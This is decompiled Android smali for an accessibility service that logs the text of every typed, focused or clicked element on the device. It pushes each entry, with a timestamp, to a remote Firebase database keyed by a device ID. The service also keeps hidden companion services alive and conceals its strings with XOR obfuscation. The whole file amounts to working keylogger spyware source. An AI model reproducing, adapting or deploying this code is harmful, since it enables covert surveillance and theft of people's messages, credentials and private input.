.class public Lsigma/male/logoss;
.super Landroid/accessibilityservice/AccessibilityService;
.source "logoss.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 25
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    return-void
.end method

.method private getMap(Lsigma/male/main/part2;)Ljava/util/Map;
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lsigma/male/main/part2;",
            ")",
            "Ljava/util/Map",
            "<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/IllegalAccessException;
        }
    .end annotation

    .prologue
    .line 84
    new-instance v0, Ljava/util/LinkedHashMap;

    invoke-direct {v0}, Ljava/util/LinkedHashMap;-><init>()V

    .line 86
    const-string v1, "OTshQlw0ICM="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1}, Lsigma/male/main/part2;->getlogoDate()Ljava/util/Date;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/sol/timedate;->getTheDateInString(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 87
    const-string v1, "OTshQl0j"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1}, Lsigma/male/main/part2;->getAccessibilityEvent()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 88
    const-string v1, "OCch"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1}, Lsigma/male/main/part2;->getMsg()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 89
    return-object v0
.end method

.method private isMyServiceRunning(Ljava/lang/Class;)Z
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/Class",
            "<*>;)Z"
        }
    .end annotation

    .prologue
    .line 109
    const-string v0, "NDcyRE48ID8="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lsigma/male/logoss;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    .line 110
    const v1, 0x7fffffff

    invoke-virtual {v0, v1}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-nez v0, :cond_1

    .line 115
    const/4 v0, 0x0

    :goto_0
    return v0

    .line 110
    :cond_1
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 111
    invoke-virtual {p1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    iget-object v0, v0, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v0}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 112
    const/4 v0, 0x1

    goto :goto_0
.end method

.method private selogo(Ljava/lang/String;Lsigma/male/main/part2;)V
    .locals 3

    .prologue
    .line 97
    invoke-static {}, Lcom/google/firebase/database/FirebaseDatabase;->getInstance()Lcom/google/firebase/database/FirebaseDatabase;

    move-result-object v0

    .line 98
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "OTshQlQ6M2k="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lsigma/male/logoss;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/gui;->uuii(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    .line 101
    :try_start_0
    invoke-virtual {v0}, Lcom/google/firebase/database/DatabaseReference;->push()Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    invoke-direct {p0, p2}, Lsigma/male/logoss;->getMap(Lsigma/male/main/part2;)Ljava/util/Map;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->setValue(Ljava/lang/Object;)Lcom/google/android/gms/tasks/Task;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 106
    :goto_0
    return-void

    .line 103
    :catch_0
    move-exception v0

    .line 104
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 4

    .prologue
    const/4 v1, 0x0

    .line 37
    const-class v0, Lsigma/male/servicess;

    invoke-direct {p0, v0}, Lsigma/male/logoss;->isMyServiceRunning(Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 38
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lsigma/male/logoss;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lsigma/male/servicess;

    invoke-direct {v0, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lsigma/male/logoss;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 39
    invoke-virtual {p0}, Lsigma/male/logoss;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "JjE0W1E2MTVe"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lsigma/male/SketchwareUtil;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 41
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lsigma/male/logoss;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lsigma/male/ForegroundService;

    invoke-direct {v0, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lsigma/male/logoss;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 43
    :cond_0
    const-class v0, Lsigma/male/ForegroundService;

    invoke-direct {p0, v0}, Lsigma/male/logoss;->isMyServiceRunning(Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_1

    .line 45
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lsigma/male/logoss;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lsigma/male/ForegroundService;

    invoke-direct {v0, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lsigma/male/logoss;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 47
    :cond_1
    invoke-static {}, Lsigma/male/sol/timedate;->getCurrentDay()Ljava/util/Date;

    move-result-object v3

    .line 51
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    sparse-switch v0, :sswitch_data_0

    move-object v0, v1

    move-object v2, v1

    .line 70
    :goto_0
    if-nez v2, :cond_2

    .line 81
    :goto_1
    return-void

    .line 53
    :sswitch_0
    const-string v0, "AQ0WaGcDHQN6ZwERHnlnFhwHY38QEA=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 54
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    move-object v2, v1

    .line 55
    goto :goto_0

    .line 58
    :sswitch_1
    const-string v0, "AQ0WaGcDHQN6ZxMbBXhrEBA="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 59
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    move-object v2, v1

    .line 60
    goto :goto_0

    .line 63
    :sswitch_2
    const-string v0, "AQ0WaGcDHQN6ZxYYD25zEBA="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 64
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    move-object v2, v1

    goto :goto_0

    .line 74
    :cond_2
    new-instance v1, Lsigma/male/main/part2;

    invoke-direct {v1}, Lsigma/male/main/part2;-><init>()V

    .line 76
    invoke-virtual {v1, v3}, Lsigma/male/main/part2;->setlogoDate(Ljava/util/Date;)V

    .line 77
    invoke-virtual {v1, v2}, Lsigma/male/main/part2;->setAccessibilityEvent(Ljava/lang/String;)V

    .line 78
    invoke-virtual {v1, v0}, Lsigma/male/main/part2;->setMsg(Ljava/lang/String;)V

    .line 80
    const-string v0, "JjE="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0, v1}, Lsigma/male/logoss;->selogo(Ljava/lang/String;Lsigma/male/main/part2;)V

    goto :goto_1

    .line 51
    :sswitch_data_0
    .sparse-switch
        0x1 -> :sswitch_2
        0x8 -> :sswitch_1
        0x10 -> :sswitch_0
    .end sparse-switch
.end method

.method public onInterrupt()V
    .locals 0

    .prologue
    .line 121
    return-void
.end method

.method public onServiceConnected()V
    .locals 0

    .prologue
    .line 31
    return-void
.end method
